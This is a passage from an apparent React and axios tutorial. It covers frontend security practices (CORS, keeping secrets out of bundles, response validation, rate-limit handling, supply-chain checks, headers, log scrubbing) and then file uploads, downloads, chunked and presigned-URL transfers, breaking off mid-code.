  const token = getAccessToken();
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

api.interceptors.response.use(
  (res) => res,
  async (error) => {
    if (error.response?.status === 401 && !error.config._retry) {
      error.config._retry = true;
      const { data } = await api.post("/refresh"); // HttpOnly cookie sent automatically
      setAccessToken(data.accessToken);
      error.config.headers.Authorization = `Bearer ${data.accessToken}`;
      return api(error.config);
    }
    return Promise.reject(error);
  }
);

If you persist a token, you've accepted the XSS risk

There are legitimate reasons teams use localStorage (no shared cookie domain, mobile-webview constraints, third-party API tokens with tight scopes). That's a decision, not a default — and it only holds if your XSS defenses (§2) are airtight, tokens are short-lived, and the scope is minimal. Do not reach for it just to dodge a refresh flow.

docs.title: 6️⃣ CORS — A Browser Policy, Not Authentication
docs.text:
CORS (Cross-Origin Resource Sharing) is the most misunderstood topic in frontend security.

CORS does NOT protect your server

CORS is a browser-enforced policy that protects the user, not the server. It controls whether browser JavaScript is allowed to read a cross-origin response. It does not stop requests from reaching your server, and it is trivially bypassed by any non-browser client (curl, Postman, a script, a mobile app). CORS is not authentication, not authorization, and not a firewall.

docs.title: What actually happens
docs.text:
1. The Same-Origin Policy blocks JS on app.example.com from reading responses from api.other.com.
  2. CORS is the server's way of saying "it's OK for that origin's JS to read my responses," via Access-Control-Allow-Origin and friends.
  3. For "non-simple" requests, the browser first sends a preflight OPTIONS request to ask permission.
Browser → OPTIONS /data (preflight) → Server replies:
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: GET, POST
  Access-Control-Allow-Headers: Authorization, Content-Type
  Access-Control-Allow-Credentials: true
Browser → actual GET /data (only now)

// Frontend side: to send cookies cross-origin you opt in:
const api = axios.create({
  baseURL: "https://api.example.com",
  withCredentials: true, // browser includes cookies; server MUST allow credentials
});

Two CORS misconfigurations to avoid

  1. Access-Control-Allow-Origin: * with credentials is forbidden by the spec — and reflecting any Origin back while allowing credentials effectively trusts every site. Whitelist exact origins.
  2. A CORS error in the console means your server didn't grant permission — fix it on the server. Do not "solve" it by disabling browser security, using a public CORS-proxy in production, or weakening the policy to *.

Where real protection lives

Because CORS doesn't stop requests, your server must still authenticate every request (tokens/cookies) and authorize every action. Treat CORS purely as "which front-end origins may read my responses in a browser."

docs.title: 7️⃣ Secrets Handling — Never Ship Secrets to the Client
docs.text:
Everything in your bundle is public

Your JS bundle, your .env values that get inlined, your source maps — all of it is downloadable and readable by anyone. There is no such thing as a secret in the browser. A "hidden" API key in your React code is a published API key.

docs.title: Build-time env vars are embedded, not hidden
docs.text:
Vite and Next.js inline certain env vars into the bundle at build time. The prefix is a signal that the value is public:

Framework Public prefix (shipped to browser) Private (server-only) Vite VITE_ → import.meta.env.VITE_* anything without the prefix Next.js NEXT_PUBLIC_ → process.env.NEXT_PUBLIC_* process.env.* used only in server code Create React App REACT_APP_ n/a 
// FINE — public config: API base URL, publishable keys (e.g. a Stripe *publishable* key)
const apiUrl = import.meta.env.VITE_API_URL;

// NEVER — this secret is now in your bundle for the world to read:
const stripeSecret = import.meta.env.VITE_STRIPE_SECRET_KEY; // ❌❌❌

VITE_ / NEXT_PUBLIC_ = intentionally public

Anything you prefix this way is compiled into client code. Only put values there that you're comfortable printing on a billboard: API base URLs, publishable/anon keys designed for client exposure, feature flags. Real secrets (private API keys, DB credentials, signing secrets) must stay server-side and be accessed only by your backend / serverless functions / BFF.

The pattern for third-party secrets

If the frontend needs to call a service that requires a secret key (payment provider, email API, AI provider), proxy through your own backend. The browser calls your endpoint (authenticated); your server adds the secret and calls the third party. The secret never leaves the server.

Also: keep .env* files out of git (.gitignore), and disable or restrict source maps in production if your build would otherwise expose internal structure.

docs.title: 8️⃣ Input Validation & Response Validation (Zod)
docs.text:
Client validation is for UX; server validation is for security

Validate input on the client so users get instant feedback — but never rely on it for security. Anyone can bypass the form. The server must re-validate everything. That said, the frontend should still validate what comes back, because a malformed/untrusted response can crash your app or feed bad data into dangerous sinks.

docs.title: Validating API responses with Zod
docs.text:
Treating API responses as any is how undefined is not a function ends up in production. A schema gives you runtime guarantees and TypeScript types from one source.

import { z } from "zod";
import { api } from "./api";

const User = z.object({
  id: z.string().uuid(),
  email: z.string().email(),
  role: z.enum(["user", "admin"]),
  // Validate any URL you'll later put in href/src
  avatarUrl: z.string().url().startsWith("https://").optional(),
});

type User = z.infer<typeof User>;

export async function getUser(id: string): Promise<User> {
  const { data } = await api.get(`/users/${id}`);
  // Throws if the server sent something unexpected — fail loud, not silently
  return User.parse(data);
}

Validate, sanitize, then render

The safe pipeline is: validate the shape (Zod) → sanitize any HTML/URLs (DOMPurify, scheme allow-list) → render as text via React. Each step assumes the previous data is still untrusted.

docs.title: 9️⃣ Rate Limiting & Abuse — The Client's Role
docs.text:
Rate limiting is enforced on the server

A client cannot rate-limit an attacker — the attacker controls the client. Brute-force protection, per-IP/per-account throttling, and bot mitigation are server-side. The frontend's job is to (a) not cause abuse, and (b) handle 429 Too Many Requests gracefully.

docs.title: Be a good client
docs.text:
• Debounce/throttle search-as-you-type and autosave so you don't hammer the API (see 14.4 Advanced API Scenarios).
  • Cancel stale in-flight requests with AbortController.
  • Cache with React Query/SWR instead of refetching constantly.

docs.title: Handle 429 correctly (respect Retry-After)
docs.text:
api.interceptors.response.use(
  (res) => res,
  async (error) => {
    if (error.response?.status === 429) {
      const retryAfter = Number(error.response.headers["retry-after"]) || 5;
      // Back off, surface a friendly message, then retry once
      await new Promise((r) => setTimeout(r, retryAfter * 1000));
      return api(error.config);
    }
    return Promise.reject(error);
  }
);

Don't auto-retry blindly

Retrying 4xx errors (except 429) usually just repeats a client mistake. Only retry idempotent requests, cap the attempts, and use exponential backoff with jitter so you don't synchronize a thundering herd against an already-struggling server.

docs.title: 🔟 Dependency & Supply-Chain Hygiene
docs.text:
A typical React app ships hundreds of transitive dependencies. Each is code you execute and a potential attack vector (typosquatting, hijacked maintainer accounts, malicious post-install scripts).

# Audit for known vulnerabilities
npm audit
npm audit fix          # apply safe fixes
npm audit --production # focus on what actually ships, not devDependencies

# pnpm / yarn equivalents
pnpm audit
yarn npm audit

Lockfiles are a security control

Commit your lockfile (package-lock.json / pnpm-lock.yaml / yarn.lock). It pins exact versions and integrity hashes so a dependency can't silently change under you. In CI, install with npm ci (not npm install) so builds use the locked tree exactly.

Supply-chain checklist

  • Review new dependencies before adding them (downloads, maintenance, last publish, install scripts).
  • Prefer fewer, well-maintained packages over many micro-deps.
  • Enable automated updates with review (Dependabot / Renovate) — patch fast, but don't auto-merge majors.
  • Be wary of post-install scripts; consider --ignore-scripts in CI where feasible.
  • Pin and verify anything loaded from a CDN with Subresource Integrity (SRI): 
    <script src="https://cdn.example/lib.js"
        integrity="sha384-…" crossorigin="anonymous"></script>

docs.title: 1️⃣1️⃣ Secure HTTP Headers
docs.text:
Most frontend hardening is delivered via response headers set by your server, CDN, or host (Netlify/Vercel config, nginx, Express helmet). Know what each does:

Header Purpose Content-Security-Policy Restrict script/style/connect sources — top XSS mitigation (§2) Strict-Transport-Security Force HTTPS (§4) X-Content-Type-Options: nosniff Stop MIME-sniffing that can turn data into script X-Frame-Options: DENY / CSP frame-ancestors 'none' Prevent clickjacking via iframing Referrer-Policy: strict-origin-when-cross-origin Limit URL/PII leakage in the Referer header Permissions-Policy Disable unused powerful features (camera, geolocation, …)

Use a vetted middleware

On an Express/Node BFF, helmet sets sane defaults for most of these in one line. On static hosts, configure them in your platform's headers file. Then verify the result with a header scanner (e.g. securityheaders.com) — defaults change, and a meta-tag CSP can't cover everything.

docs.title: 1️⃣2️⃣ Logging & PII Concerns
docs.text:
Frontend logging quietly leaks sensitive data if you're not careful.

Don't log secrets or PII to the console or to third parties

console.log(response) in production can dump tokens, emails, and personal data into the console and into any error-monitoring/analytics tool you've wired up (Sentry, LogRocket, session replay).

  • Strip credentials from anything logged — tokens, Authorization headers, cookies, passwords.
  • Configure error monitors to scrub PII (Sentry beforeSend, deny-lists for fields like password, token, ssn).
  • Session replay tools (FullStory/LogRocket) record the DOM — mask inputs (passwords, card numbers, anything PII) so they aren't captured.
  • Don't put PII in URLs — query strings land in server logs, browser history, and the Referer header. Send sensitive data in the body of a POST.
  • Remove debug console.* calls from production builds (lint rule / build strip).
// Scrub before reporting to an error monitor
function scrub(obj) {
  const SENSITIVE = ["password", "token", "authorization", "cookie", "ssn", "card"];
  return Object.fromEntries(
    Object.entries(obj).map(([k, v]) =>
      SENSITIVE.some((s) => k.toLowerCase().includes(s)) ? [k, "[REDACTED]"] : [k, v]
    )
  );
}

docs.title: ✅ Actionable Best-Practices Checklist
docs.text:
Ship-it security checklist for a React + API frontend

Transport

  • [ ] HTTPS everywhere; HTTP redirects to HTTPS
  • [ ] Strict-Transport-Security (HSTS) enabled, ideally preloaded
  • [ ] No mixed content

XSS

  • [ ] No dangerouslySetInnerHTML on unsanitized data
  • [ ] DOMPurify for any user-authored HTML
  • [ ] URL scheme allow-list for href/src (block javascript:)
  • [ ] Strict CSP (no 'unsafe-inline'/'unsafe-eval'), nonce/hash based

Tokens & auth

  • [ ] Refresh token in HttpOnly + Secure + SameSite cookie
  • [ ] Access token in memory only, short-lived
  • [ ] No credentials in localStorage (unless XSS risk explicitly accepted)
  • [ ] Secure logout actually invalidates the session server-side

CSRF (cookie auth)

  • [ ] SameSite=Lax/Strict on auth cookies
  • [ ] CSRF token / double-submit for state-changing requests

CORS

  • [ ] Exact-origin allow-list on the server (never * with credentials)
  • [ ] Understood as a browser policy, not as server protection

Secrets

  • [ ] No secrets in the bundle; only VITE_/NEXT_PUBLIC_ public values exposed
  • [ ] Third-party secret keys proxied through the backend
  • [ ] .env* git-ignored; production source maps restricted

Data integrity

  • [ ] API responses validated at runtime (Zod), not trusted as any
  • [ ] Server re-validates all input (client validation is UX only)

Resilience & abuse

  • [ ] Debounce/throttle/cancel/cache to avoid self-inflicted load
  • [ ] 429 handled with Retry-After; retries use backoff + jitter

Supply chain

  • [ ] Lockfile committed; CI uses npm ci
  • [ ] npm audit in CI; Dependabot/Renovate enabled
  • [ ] SRI on CDN-loaded scripts

Headers & logging

  • [ ] Security headers set (helmet/host config) and verified
  • [ ] No tokens/PII in logs, console, URLs, or session replays

The one-sentence summary

The frontend protects the user (XSS, secure storage, HTTPS, no leaked PII) and behaves as a trustworthy client (validates I/O, respects rate limits, ships no secrets) — but every decision that matters for security is re-enforced on the server, because the client can never be trusted.

docs.title: File Handling
docs.text:
Handling files is one of the most common — and most error-prone — parts of building a real app: profile pictures, document uploads, CSV exports, PDF previews, video streams. This chapter covers the browser primitives (File, Blob, FormData), then wires them up to axios v1 for uploads and downloads with progress, validation, cancellation, chunked/resumable transfers, and direct-to-cloud flows — finishing with a reusable useFileUpload hook.

Builds on the Axios chapter

The Axios chapter already introduced basic uploadFile / downloadFile with onUploadProgress and responseType: "blob". Here we go deeper: typed progress events, validation, previews, chunking, streaming, abort, and presigned URLs. The patterns stay consistent — same AxiosProgressEvent, same divide-by-zero guard, same object-URL revocation.

docs.title: 1️⃣ Browser File Primitives
docs.text: Before talking to any API, you need to understand the objects the browser hands you.

docs.title: File, Blob & FileList
docs.text:
• Blob — immutable raw binary data (size, type). The base building block.
  • File — a Blob with extra metadata (name, lastModified). This is what <input type="file"> gives you.
  • FileList — array-like collection of File objects (from input.files or a drop event). Not a real array — convert with Array.from().
const input = document.querySelector<HTMLInputElement>("#file")!;
const files: FileList | null = input.files;

if (files) {
  const list: File[] = Array.from(files);
  list.forEach((file) => {
    console.log(file.name);          // "photo.png"
    console.log(file.size);          // bytes
    console.log(file.type);          // "image/png"
    console.log(file.lastModified);  // timestamp
  });
}

docs.title: Creating Blobs & Files manually
docs.text:
Useful for generating downloads, slicing for chunked uploads, or building test fixtures.

// A text Blob
const blob = new Blob(["id,name\n1,Ada\n2,Linus"], { type: "text/csv" });

// A File from a Blob (e.g., a generated report)
const file = new File([blob], "users.csv", { type: "text/csv" });

// Slicing — the core of chunked uploads
const firstChunk = file.slice(0, 1024 * 1024, file.type); // first 1 MB

docs.title: Reading file contents
docs.text:
Modern code prefers the promise-based Blob / File methods over the old FileReader:

declare const file: File;

const text = await file.text();             // string
const buffer = await file.arrayBuffer();    // ArrayBuffer
const stream = file.stream();               // ReadableStream

FileReader is legacy

FileReader (with onload / readAsDataURL) still works and is needed for some older targets, but file.text() / file.arrayBuffer() are cleaner. For previews, prefer URL.createObjectURL() (below) over base64 data URLs — it's faster and uses far less memory.

docs.title: Controlled file input
docs.text:
A file input is uncontrolled for its value (you cannot set value programmatically for security reasons), so track the selected files in state.

import { useState, ChangeEvent } from "react";

function FilePicker() {
  const [files, setFiles] = useState<File[]>([]);

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    if (e.target.files) {
      setFiles(Array.from(e.target.files));
    }
  };

  return (
    <div>
      <input
        type="file"
        multiple
        accept="image/*,.pdf"
        onChange={handleChange}
      />
      <ul>
        {files.map((f) => (
          <li key={f.name}>
            {f.name} — {(f.size / 1024).toFixed(1)} KB
          </li>
        ))}
      </ul>
    </div>
  );
}
  • multiple allows selecting more than one file.
  • accept is a hint to the OS file dialog (image/*, .pdf, application/pdf). Never trust it for validation — always re-check in JS (and on the server).

docs.title: Drag-and-drop drop zone
docs.text:
A drop zone needs three handlers: onDragOver (must preventDefault to allow a drop), onDragLeave, and onDrop.

import { useState, DragEvent } from "react";

function DropZone({ onFiles }: { onFiles: (files: File[]) => void }) {
  const [isOver, setIsOver] = useState(false);

  const handleDragOver = (e: DragEvent<HTMLDivElement>) => {
    e.preventDefault();        // REQUIRED — otherwise the browser opens the file
    setIsOver(true);
  };

  const handleDragLeave = (e: DragEvent<HTMLDivElement>) => {
    e.preventDefault();
    setIsOver(false);
  };

  const handleDrop = (e: DragEvent<HTMLDivElement>) => {
    e.preventDefault();
    setIsOver(false);
    if (e.dataTransfer.files?.length) {
      onFiles(Array.from(e.dataTransfer.files));
    }
  };

  return (
    <div
      onDragOver={handleDragOver}
      onDragLeave={handleDragLeave}
      onDrop={handleDrop}
      style={{
        border: `2px dashed ${isOver ? "#2563eb" : "#cbd5e1"}`,
        borderRadius: 8,
        padding: 32,
        textAlign: "center",
        background: isOver ? "#eff6ff" : "transparent",
      }}
    >
      Drag & drop files here, or click to browse
    </div>
  );
}

Always preventDefault on dragover

If you forget e.preventDefault() inside onDragOver, the onDrop event will never fire — the browser will instead navigate to / open the dropped file. This is the single most common drag-and-drop bug.

docs.title: 3️⃣ FormData — the upload envelope
docs.text:
multipart/form-data is how browsers send files. FormData builds that payload for you.

const formData = new FormData();

// Append a single file (3rd arg overrides the filename sent to the server)
formData.append("avatar", file, file.name);

// Append regular fields alongside files
formData.append("userId", "42");
formData.append("title", "My upload");

// Append MANY files under the same key
files.forEach((f) => formData.append("documents", f));
// → server receives an array under "documents"

Let axios set the boundary

With axios v1 and a browser FormData, do not manually set Content-Type: multipart/form-data. Axios detects FormData and sets the header including the required boundary for you. Setting it by hand drops the boundary and the server can't parse the body. (The Axios chapter set it explicitly for illustration; in practice, omit it and let axios handle it.)

docs.title: A shared API client
docs.text:
// api.ts
import axios from "axios";

export const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL ?? "https://api.example.com",
  withCredentials: true,
});

docs.title: Single file upload
docs.text:
import { api } from "./api";

interface UploadResult {
  id: string;
  url: string;
}

async function uploadAvatar(file: File): Promise<UploadResult> {
  const formData = new FormData();
  formData.append("avatar", file);

  const { data } = await api.post<UploadResult>("/upload/avatar", formData);
  // No manual Content-Type — axios sets multipart + boundary automatically.
  return data;
}

docs.title: Multiple file upload
docs.text:
async function uploadDocuments(files: File[]): Promise<UploadResult[]> {
  const formData = new FormData();
  files.forEach((file) => formData.append("documents", file));

  const { data } = await api.post<UploadResult[]>("/upload/documents", formData);
  return data;
}

One request vs. many

Appending every file to a single FormData sends one request — simple, but a failure loses the whole batch and you only get one combined progress number. Uploading each file in its own request (e.g. Promise.all(files.map(uploadOne))) gives per-file progress and isolated retries. Choose based on UX needs.

docs.title: 5️⃣ Upload Progress with onUploadProgress
docs.text:
Axios reports progress through onUploadProgress, typed as AxiosProgressEvent. Always guard the percentage math against a missing/zero total (division by zero → NaN / Infinity).

import { api } from "./api";
import type { AxiosProgressEvent } from "axios";

async function uploadWithProgress(
  file: File,
  onProgress: (percent: number) => void
) {
  const formData = new FormData();
  formData.append("file", file);

  const { data } = await api.post("/upload", formData, {
    onUploadProgress: (event: AxiosProgressEvent) => {
      // Guard: total can be undefined (unknown size) or 0
      const total = event.total ?? 0;
      if (total <= 0) return;
      const percent = Math.round((event.loaded * 100) / total);
      onProgress(percent);
    },
  });

  return data;
}

AxiosProgressEvent also exposes event.progress (0–1, already computed), event.rate (bytes/sec), and event.estimated (seconds remaining) when available — handy for speed/ETA UIs:

onUploadProgress: (event: AxiosProgressEvent) => {
  const percent = Math.round((event.progress ?? 0) * 100); // 0–1 → %
  const kbps = event.rate ? Math.round(event.rate / 1024) : null;
  const eta = event.estimated ? Math.ceil(event.estimated) : null;
  console.log(`${percent}%  ${kbps ?? "?"} KB/s  ETA ${eta ?? "?"}s`);
}

docs.title: A progress bar component
docs.text:
import { useState } from "react";

function UploadField() {
  const [percent, setPercent] = useState(0);
  const [busy, setBusy] = useState(false);

  const handleUpload = async (file: File) => {
    setBusy(true);
    setPercent(0);
    try {
      await uploadWithProgress(file, setPercent);
    } finally {
      setBusy(false);
    }
  };

  return (
    <div>
      <input
        type="file"
        disabled={busy}
        onChange={(e) => e.target.files?.[0] && handleUpload(e.target.files[0])}
      />
      {busy && (
        <progress value={percent} max={100}>
          {percent}%
        </progress>
      )}
    </div>
  );
}

docs.title: 6️⃣ Client-Side Validation (size & type)
docs.text:
Validate before uploading to fail fast and save bandwidth. Treat this as UX only — the server must validate too (clients can be bypassed).

const MAX_SIZE = 5 * 1024 * 1024; // 5 MB
const ALLOWED_TYPES = ["image/png", "image/jpeg", "image/webp"];

interface ValidationError {
  file: string;
  reason: string;
}

function validateFiles(files: File[]): {
  valid: File[];
  errors: ValidationError[];
} {
  const valid: File[] = [];
  const errors: ValidationError[] = [];

  for (const file of files) {
    if (file.size > MAX_SIZE) {
      errors.push({
        file: file.name,
        reason: `Too large (${(file.size / 1024 / 1024).toFixed(1)} MB, max 5 MB)`,
      });
    } else if (!ALLOWED_TYPES.includes(file.type)) {
      errors.push({ file: file.name, reason: `Unsupported type: ${file.type || "unknown"}` });
    } else {
      valid.push(file);
    }
  }

  return { valid, errors };
}

file.type is spoofable

The MIME type comes from the OS / extension and can lie. For sensitive flows, sniff the real type from the file's magic bytes (read the first few bytes of arrayBuffer() and compare signatures), and always re-verify on the server.

docs.title: 7️⃣ Image Preview with createObjectURL
docs.text:
URL.createObjectURL(file) returns a short-lived blob: URL pointing at the file in memory — ideal for instant previews without uploading or base64-encoding. Each URL holds the blob in memory until you revoke it, so revocation is mandatory to avoid leaks.

import { useState, useEffect } from "react";

function ImagePreview({ file }: { file: File }) {
  const [url, setUrl] = useState<string>("");

  useEffect(() => {
    const objectUrl = URL.createObjectURL(file);
    setUrl(objectUrl);

    // Cleanup: revoke when file changes or component unmounts
    return () => URL.revokeObjectURL(objectUrl);
  }, [file]);

  return url ? <img src={url} alt={file.name} width={200} /> : null;
}

For a list of previews, revoke every URL on cleanup:

import { useState, useEffect } from "react";

function Gallery({ files }: { files: File[] }) {
  const [urls, setUrls] = useState<string[]>([]);

  useEffect(() => {
    const next = files.map((f) => URL.createObjectURL(f));
    setUrls(next);
    return () => next.forEach((u) => URL.revokeObjectURL(u));
  }, [files]);

  return (
    <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
      {urls.map((u, i) => (
        <img key={files[i].name} src={u} alt={files[i].name} width={120} />
      ))}
    </div>
  );
}

Always revoke object URLs

Forgetting URL.revokeObjectURL() leaks memory — every preview pins its file in RAM for the page's lifetime. Revoke in the useEffect cleanup (or right after the <img> loads if it's a one-shot).

docs.title: 8️⃣ Canceling Uploads & Downloads (AbortController)
docs.text:
axios v1 supports the standard AbortController. Pass its signal in the request config, then call controller.abort() to cancel. (The deprecated CancelToken still works but prefer AbortController — see the Axios chapter.)

import axios, { AxiosProgressEvent } from "axios";
import { api } from "./api";

async function uploadCancelable(
  file: File,
  signal: AbortSignal,
  onProgress: (p: number) => void
) {
  const formData = new FormData();
  formData.append("file", file);

  try {
    const { data } = await api.post("/upload", formData, {
      signal,
      onUploadProgress: (e: AxiosProgressEvent) => {
        const total = e.total ?? 0;
        if (total > 0) onProgress(Math.round((e.loaded * 100) / total));
      },
    });
    return data;
  } catch (err) {
    if (axios.isCancel(err)) {
      console.warn("Upload canceled by user");
      return null;
    }
    throw err;
  }
}

A component with a Cancel button:

import { useRef, useState } from "react";

function CancelableUpload() {
  const [percent, setPercent] = useState(0);
  const [busy, setBusy] = useState(false);
  const controllerRef = useRef<AbortController | null>(null);

  const start = async (file: File) => {
    const controller = new AbortController();
    controllerRef.current = controller;
    setBusy(true);
    try {
      await uploadCancelable(file, controller.signal, setPercent);
    } finally {
      setBusy(false);
      controllerRef.current = null;
    }
  };

  return (
    <div>
      <input
        type="file"
        disabled={busy}
        onChange={(e) => e.target.files?.[0] && start(e.target.files[0])}
      />
      {busy && (
        <>
          <progress value={percent} max={100} />
          <button onClick={() => controllerRef.current?.abort()}>Cancel</button>
        </>
      )}
    </div>
  );
}

Detecting cancellation

Use axios.isCancel(err) to distinguish a deliberate abort from a real failure. The thrown error's name is "CanceledError". Always abort in-flight requests on unmount to avoid setting state on a dead component.

docs.title: 9️⃣ Downloading Files (blob responses)
docs.text:
To download binary data, set responseType: "blob", then turn the blob into an object URL and click a temporary anchor.

import { api } from "./api";

async function downloadFile(url: string, filename: string) {
  const response = await api.get(url, { responseType: "blob" });

  // Prefer the server's Content-Disposition filename when present
  const disposition = response.headers["content-disposition"] as string | undefined;
  const serverName = disposition?.match(/filename="?([^"]+)"?/)?.[1];

  const blobUrl = URL.createObjectURL(response.data);
  const link = document.createElement("a");
  link.href = blobUrl;
  link.download = serverName ?? filename;
  document.body.appendChild(link);
  link.click();
  link.remove();
  URL.revokeObjectURL(blobUrl); // revoke immediately — the download is already queued
}

// downloadFile("/reports/2026-q2.pdf", "report.pdf");

docs.title: Download progress
docs.text:
onDownloadProgress mirrors onUploadProgress — same AxiosProgressEvent, same guard. Note that event.total may be missing if the server omits Content-Length (e.g. chunked transfer encoding).

import type { AxiosProgressEvent } from "axios";

async function downloadWithProgress(
  url: string,
  filename: string,
  onProgress: (p: number) => void
) {
  const response = await api.get(url, {
    responseType: "blob",
    onDownloadProgress: (event: AxiosProgressEvent) => {
      const total = event.total ?? 0;
      if (total <= 0) return; // unknown length — show a spinner instead
      onProgress(Math.round((event.loaded * 100) / total));
    },
  });

  const blobUrl = URL.createObjectURL(response.data);
  const link = document.createElement("a");
  link.href = blobUrl;
  link.download = filename;
  link.click();
  URL.revokeObjectURL(blobUrl);
}

docs.title: Generating files client-side
docs.text:
The same anchor-click trick downloads files you build in the browser — no server round trip:

function downloadCsv(rows: string[][], filename = "export.csv") {
  const csv = rows.map((r) => r.join(",")).join("\n");
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

docs.title: 🔟 Previewing PDFs & Images
docs.text:
You can preview a downloaded blob inline rather than forcing a download.

import { useEffect, useState } from "react";
import { api } from "./api";

function PdfViewer({ url }: { url: string }) {
  const [blobUrl, setBlobUrl] = useState<string>("");

  useEffect(() => {
    let active = true;
    let created = "";

    api
      .get(url, { responseType: "blob" })
      .then((res) => {
        // Ensure the browser treats it as a PDF
        const pdfBlob = new Blob([res.data], { type: "application/pdf" });
        created = URL.createObjectURL(pdfBlob);
        if (active) setBlobUrl(created);
      });

    return () => {
      active = false;
      if (created) URL.revokeObjectURL(created);
    };
  }, [url]);

  if (!blobUrl) return <p>Loading PDF…</p>;

  return (
    <iframe
      src={blobUrl}
      title="PDF preview"
      width="100%"
      height={600}
      style={{ border: "none" }}
    />
  );
}
  • PDFs: render in an <iframe> or <embed> pointing at the object URL. For richer control (page navigation, text layer), use a library such as pdf.js / react-pdf.
  • Images: just point an <img src> at the object URL (see §7). Same revocation rules apply.

docs.title: 1️⃣1️⃣ Chunked & Resumable Uploads
docs.text:
For very large files (or flaky networks), split the file into chunks, upload them one by one, and let the server reassemble. If the connection drops, you resume from the last acknowledged chunk instead of restarting.

The concept:

  1. Slice the file into fixed-size chunks with file.slice().
  2. Upload each chunk with its index + total count + a stable upload ID.
  3. Track which chunks succeeded; on resume, skip them.
  4. After the last chunk, call a "complete" endpoint so the server stitches them together.
import { api } from "./api";
import type { AxiosProgressEvent } from "axios";

const CHUNK_SIZE = 5 * 1024 * 1024; // 5 MB

interface ChunkUploadOptions {
  uploadId: string;            // stable id for this file (uuid)
  signal?: AbortSignal;
  onProgress?: (percent: number) => void;
  startChunk?: number;         // resume point
}

async function uploadInChunks(file: File, opts: ChunkUploadOptions) {
  const totalChunks = Math.ceil(file.size / CHUNK_SIZE);
  const start = opts.startChunk ?? 0;

  for (let index = start; index < totalChunks; index++) {
    const from = index * CHUNK_SIZE;
    const blob = file.slice(from, from + CHUNK_SIZE);

    const formData = new FormData();
    formData.append("uploadId", opts.uploadId);
    formData.append("index", String(index));
    formData.append("totalChunks", String(totalChunks));
    formData.append("chunk", blob, file.name);

    await api.post("/upload/chunk", formData, {
      signal: opts.signal,
      onUploadProgress: (e: AxiosProgressEvent) => {
        const chunkTotal = e.total ?? 0;
        if (chunkTotal <= 0) return;
        const chunkFraction = e.loaded / chunkTotal;          // 0–1 within this chunk
        const overall = (index + chunkFraction) / totalChunks; // 0–1 across the file
        opts.onProgress?.(Math.round(overall * 100));
      },
    });
  }

  // Tell the server to assemble the chunks into the final file
  const { data } = await api.post("/upload/complete", {
    uploadId: opts.uploadId,
    filename: file.name,
    totalChunks,
  });
  return data;
}

Resuming after a failure — ask the server which chunks it already has, then restart from there:

async function resumeUpload(file: File, uploadId: string) {
  const { data } = await api.get<{ uploadedChunks: number[] }>(
    `/upload/status/${uploadId}`
  );
  const next = data.uploadedChunks.length; // assumes sequential upload
  return uploadInChunks(file, { uploadId, startChunk: next });
}

Production-grade resumable uploads

Rolling your own is great for learning. For production, consider the tus protocol (tus-js-client) or Uppy, which handle chunking, resume, retries, and parallelism for you. Cloud providers (S3 multipart, GCS resumable) also expose native resumable APIs.

docs.title: 1️⃣2️⃣ Streaming Large Files
docs.text:
When a file is too big to hold in memory as one blob, stream it. The Fetch API exposes the response body as a ReadableStream, letting you process bytes as they arrive (and compute progress even when axios can't, since axios buffers the whole response).

async function streamDownload(url: string, onProgress: (p: number) => void) {
  const response = await fetch(url);
  if (!response.body) throw new Error("ReadableStream not supported");

  const total = Number(response.headers.get("Content-Length")) || 0;
  const reader = response.body.getReader();
  const chunks: Uint8Array[] = [];
  let received = 0;

  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    if (value) {
      chunks.push(value);
      received += value.length;
      if (total > 0) onProgress(Math.round((received * 100) / total)); // guard
    }
  }

  // Reassemble into a Blob once fully read
  return new Blob(chunks);
}

For uploads, the modern (Chromium) approach streams a ReadableStream request body via fetch with duplex: "half". Browser support is still uneven, so chunked uploads (§11) remain the portable choice.

Why stream?

Streaming keeps memory flat regardless of file size, lets you start processing/rendering before the full file arrives, and powers media playback. axios buffers the whole response into a blob, so reach for fetch + ReadableStream when you specifically need incremental access.

docs.title: 1️⃣3️⃣ Uploading to Cloud Storage (Presigned URLs)
docs.text:
For large files, and to keep traffic off your own servers, upload directly to object storage (S3, GCS, R2, Azure Blob). Your backend stays in control by issuing a short-lived presigned URL; the browser then PUTs the file straight to the bucket.

The S3-style flow:

  1. Client asks your API for a presigned URL (sends filename + content type).
  2. Your server signs a time-limited PUT URL and returns it.
  3. Client uploads the file directly to that URL (with progress).
  4. Client tells your API the upload finished so it can record the object key.
import axios, { AxiosProgressEvent } from "axios";
import { api } from "./api";

interface PresignResponse {
  uploadUrl: string; // signed PUT URL on the bucket
  key: string;       // object key to store in your DB
}

async function uploadToS3(file: File, onProgress: (p: number) => void) {
  // 1. Get a presigned URL from YOUR backend
  const { data: presign } = await api.post<PresignResponse>("/uploads/presign", {
    filename: file.name,
    contentType: file.type,
  });

  // 2. PUT the raw file straight to the bucket.
  //    Use a bare axios call (not `api`) so your auth headers / baseURL aren't sent
  //    to the storage provider. Send the raw File, NOT FormData.
  await axios.put(presign.uploadUrl, file, {
    headers: { "Content-Type": file.type }, // must match what was signed
    onUploadProgress: (e: AxiosProgressEvent) => {
      const total = e.total ?? 0;
      if (total > 0) onProgress(Math.round((e.loaded * 100) / total));
    },
  });

  // 3. Confirm completion with your backend
  await api.post("/uploads/confirm", { key: presign.key });

  return presign.key;
}

Presigned upload gotchas

  • Send the raw File with PUT, not FormData — S3 presigned PUT expects the file as the request body.
  • The Content-Type you send must exactly match the one used when signing, or the bucket rejects it (SignatureDoesNotMatch).
  • Use a plain axios instance (or strip interceptors) for the storage PUT so your app's Authorization header isn't leaked to the third-party host.
  • Configure CORS on the bucket to allow PUT from your origin, or the browser blocks the request.
  • Presigned URLs expire — request them right before uploading, not at page load.

docs.title: 1️⃣4️⃣ A Reusable useFileUpload Hook
docs.text:
Pulling it all together: a typed hook with validation, progress, cancellation, and clean error handling.

// useFileUpload.ts
import { useCallback, useRef, useState } from "react";
import axios, { AxiosProgressEvent, AxiosError } from "axios";
import { api } from "./api";

type UploadStatus =
  | "idle"
  | "validating"
  | "uploading"
  | "success"
  | "error"
  | "canceled";

interface UseFileUploadOptions {
  url: string;
  fieldName?: string;          // form field key (default "file")
  maxSize?: number;            // bytes
